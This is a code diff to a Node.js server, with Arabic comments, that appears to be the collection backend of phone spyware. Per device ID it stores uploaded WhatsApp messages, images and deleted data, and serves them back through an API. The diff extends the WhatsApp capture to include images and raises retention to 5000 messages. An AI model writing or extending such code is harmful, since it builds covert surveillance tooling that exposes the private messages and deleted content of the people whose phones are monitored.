@@ -37,7 +37,7 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, images_count: imagesData.length });
         }
         
-        // ✅ حفظ المحذوفات — يدعم الصيغتين
+        // ✅ حفظ المحذوفات
         if (data.type === 'deleted_data') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -62,7 +62,7 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, deleted_count: deleted.length });
         }
         
-        // ✅ حفظ رسائل واتساب
+        // ✅ حفظ رسائل واتساب مع الصور
         if (data.type === 'whatsapp_message') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -76,10 +76,12 @@ app.post('/upload.php', (req, res) => {
                 sender: data.sender || 'غير معروف',
                 message: data.message || '',
                 timestamp: data.timestamp || Date.now(),
-                is_group: data.is_group || false
+                is_group: data.is_group || false,
+                message_type: data.message_type || 'text',
+                image_data: data.image_data || null
             });
             
-            if (waMessages.length > 1000) waMessages = waMessages.slice(-1000);
+            if (waMessages.length > 5000) waMessages = waMessages.slice(-5000);
             
             fs.writeFileSync(waFile, JSON.stringify(waMessages, null, 2));
             updateDevicesList(deviceId, null);
@@ -248,14 +250,12 @@ app.get('/api.php', (req, res) => {
             return res.json([]);
         }
         
-        // ✅ استرجاع واتساب
         if (action === 'get_whatsapp') {
             const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
             if (fs.existsSync(waFile)) return res.json(JSON.parse(fs.readFileSync(waFile, 'utf8')));
             return res.json([]);
         }
         
-        // ✅ استرجاع المحذوفات
         if (action === 'get_deleted') {
             const deletedFile = path.join(dataDir, deviceId, 'deleted_data.json');
             if (fs.existsSync(deletedFile)) return res.json(JSON.parse(fs.readFileSync(deletedFile, 'utf8')));
